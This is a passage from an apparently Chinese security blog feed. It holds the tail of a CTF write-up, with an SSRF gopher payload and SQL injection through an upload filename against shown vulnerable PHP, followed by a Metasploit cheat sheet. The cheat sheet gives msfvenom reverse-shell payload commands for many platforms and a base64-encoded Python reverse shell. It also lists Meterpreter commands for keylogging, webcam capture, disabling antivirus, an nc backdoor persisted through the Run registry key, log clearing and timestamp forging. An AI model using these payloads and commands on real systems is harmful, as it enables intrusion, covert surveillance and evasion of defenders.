class="comment"># 因为是GET请求所以要进行两次url编码</span></span><br></pre></td></tr></table></figure><p>得到路径访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//<span class="number">172.73</span><span class="number">.26</span><span class="number">.100</span>%3A80/_%250D%250APOST%<span class="number">2520</span>/%253Fa%253D1%2520HTTP/<span class="number">1.1</span>%250D%250AHost%253A%<span class="number">2520172.73</span><span class="number">.26</span><span class="number">.100</span>%250D%250AContent-<span class="type">Type</span>%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%<span class="number">25203</span>%250D%250AX-Forwarded-For%253A%<span class="number">2520127.0</span><span class="number">.0</span><span class="number">.1</span>%250D%250AReferer%253A%2520bolean.club%250D%250A%250D%250Ab%253D1%250D%250A</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>打开题目，上传文件，发现php无法上传，于是上传一个txt文件报错<br><img src="https://img-blog.csdnimg.cn/4b19320c543d43aa8691bd3e717e2a24.png"><br>修改type为ctf上传成功<br>题目提示与sql有关，尝试在filename加个单引号（逐个尝试）<br>发现报错<br><img src="https://img-blog.csdnimg.cn/ff7c8e7c9c01499d9f5573a1bf6ca7c9.png"><br>推测为报错注入<br>先报库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(select extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()))))</span><br></pre></td></tr></table></figure><p>没显示，<br><img src="https://img-blog.csdnimg.cn/4d5816c3bc794a75b7a07df68dc224c5.png"><br>有回显了<br><img src="https://img-blog.csdnimg.cn/0d270d618f0d43959a8540a4603edc7a.png"><br>接着报表，报端<br>发现不行（由于文件名字长度有限制）<br>盲猜一下<br><img src="https://img-blog.csdnimg.cn/e77e9da6dd9a480c88093e46f6959049.png"><br>仅出现一部分，利用substr函数<br><img src="https://img-blog.csdnimg.cn/044f4f4f4f1a4f748bde60dc7ea11cc1.png"><br>得到flag<br>由于在进行注入时总是多一个），看大佬博客发现<br>主页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;ç®€å•ä¸Šä¼ &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);        </span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    error_reporting(-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="variable">$dbname</span> = <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="variable">$filename_hz</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span> ,<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="variable">$filename_</span> = end(<span class="variable">$filename_hz</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$filename_</span>, <span class="variable">$name</span>) || <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$tmpname</span>   = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$name</span>      = <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$file_name</span> = md5(date(<span class="string">&#x27;YmdHis&#x27;</span>).rand(<span class="number">100</span>,<span class="number">999</span>).<span class="variable">$name</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$filename_</span>;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into upload_file values(&#x27;<span class="subst">$file_name</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>, <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$file_name</span>))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&quot;</span>.<span class="string">&quot;/upload/<span class="subst">$file_name</span>&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot; &quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;............ctf&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要）来闭合。<br><a href="https://cloud.tencent.com/developer/article/1630134">报错注入</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MSF备忘录</title>
      <link href="/2022/04/05/MSF%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>/2022/04/05/MSF%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-安装运行及初始化"><a href="#1-安装运行及初始化" class="headerlink" title="1. 安装运行及初始化"></a>1. 安装运行及初始化</h2><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msf基本命令"><a href="#2-msf基本命令" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure><h2 id="3-msfvenom生成payload"><a href="#3-msfvenom生成payload" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure><p>1.可执行程序</p><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>Mac</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><p>执行方式：直接复制可执行程序到目标机器上执行就行了。</p><p>2.Web Payloads</p><p>PHP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><p>ASP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><p>JSP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><p>WAR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure><p>3.脚本shell</p><p>Python</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><p>Bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><p>Perl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>执行方式：复制shell.py中的内容在linux命令行下执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>4.shellcode<br>Linux Based Shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><p>Windows Based Shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><p>Mac Based Shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Meterpreter基本命令"><a href="#4-Meterpreter基本命令" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2><p>首先需要先获取meterpreter：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure><p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p><p>获取到了meterpreter，就可以进行后渗透了。</p><h3 id="4-1-基本系统命令"><a href="#4-1-基本系统命令" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="4-2-文件系统命令"><a href="#4-2-文件系统命令" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-网络命令"><a href="#4-3-网络命令" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 